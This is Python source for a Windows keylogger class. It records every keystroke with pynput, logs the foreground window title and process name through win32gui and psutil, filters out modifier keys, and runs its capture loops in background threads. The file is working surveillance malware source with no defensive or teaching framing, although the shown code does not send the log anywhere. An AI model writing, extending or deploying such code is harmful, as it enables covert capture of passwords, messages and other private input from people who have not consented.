from pynput.keyboard import Key, Listener
from threading import Thread
import win32gui, time, psutil, win32process

class Keylogger:
	def __init__(self):
		self.last_window_title = ''
		self.log_text = ''
		self.log_window_title = ''

	def log_window(self,):
		w=win32gui
		title = w.GetWindowText(w.GetForegroundWindow())
		self.last_window_title = title if self.last_window_title == '' else self.last_window_title
		def active_window_process_name():
			pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
			return psutil.Process(pid[-1]).name()
		while True:
			w=win32gui
			title = w.GetWindowText(w.GetForegroundWindow())
			try:
				process_name = active_window_process_name()
			except:
				pass
			if self.last_window_title == title or title == '':
				pass
			elif self.last_window_title != title:
				self.last_window_title = title
				self.log_window_title = f'[{title}]-[{process_name}]'
				# print(self.log_window_title)

	def on_press(self, key):
		key = self.filter_key(key)
		self.log_text += key

	def filter_key(self, key):
		key = str(key).replace("'", "").replace("Key.", "")
		# key_filter = {'esc': '[Esc]',
		# 			'f1': '[F1]',
		# 			'f2': '[F2]',
		# 			'f3': '[F3]',
		# 			'f4': '[F4]',
		# 			'f5': '[F5]',
		# 			'f6': '[F6]',
		# 			'f7': '[F7]',
		# 			'f8': '[F8]',
		# 			'f9': '[F9]',
		# 			'f10': '[F10]',
		# 			'f11': '[F11]',
		# 			'f12': '[F12]',
		# 			'ctrl_l': '[Ctrl Left]',
		# 			'ctrl_r': '[Ctrl Right]',
		# 			'alt_l': '[Alt Left]',
		# 			'alt_r': '[Alt Right]',
		# 			'space': ' ',
		# 			'shift_r': '[Shift Right]',
		# 			'shift': '[Shift Left]',
		# 			'enter': '\n',
		# 			'\\': '\\',
		# 			'backspace': '[Backspace]',
					# 'delete': '[Delete]'
		# 			'up': '[Up]',
		# 			'down': '[Down]',
		# 			'left': '[Left]',
		# 			'right': '[Right]',
		# 			'tab': '[Tab]',
		# 			'caps_lock': '[Caps Lock]',
		# 			'cmd': '[Window]',
		# 			'cmd_r': '[Window]',
		# 			'menu': '[Menu]'
		# 			}
		key_filter = {'esc': '',
					'f1': '',
					'f2': '',
					'f3': '',
					'f4': '',
					'f5': '',
					'f6': '',
					'f7': '',
					'f8': '',
					'f9': '',
					'f10': '',
					'f11': '',
					'f12': '',
					'ctrl_l': '',
					'ctrl_r': '',
					'alt_l': '',
					'alt_r': '',
					'space': ' ',
					'shift_r': '',
					'shift': '',
					'enter': '\n',
					'backspace': '\n[Backspace]\n',
					'delete': '[Delete]',
					'up': '',
					'down': '',
					'left': '',
					'right': '',
					'tab': '',
					'caps_lock': '',
					'cmd': '',
					'cmd_r': '',
					'menu': '',
					'\\x01': '',
					'\\x02': '',
					'\\x03': '',
					'\\x04': '',
					'\\x05': '',
					'\\x06': '',
					'\\x13': '',
					'\\x16': '',
					'\\x1a': '',
					}
		if key in list(key_filter):
			return key_filter[key]
		return key


	def start(self):
		log_window_thread = Thread(target=self.log_window)
		def keylog():
			with Listener(on_press=self.on_press) as listener:
				listener.join()
		keylog_thr = Thread(target=keylog, daemon=True)
		keylog_thr.start()
		log_window_thread.start()

# keyl = Keylogger()
# keyl.start()
# while True:
# 	if keyl.log == '':
# 		pass
# 	else:
# 		print(keyl.log)
# 		keyl.log = ''
# 	keyl.log_window()
# 	time.sleep(5)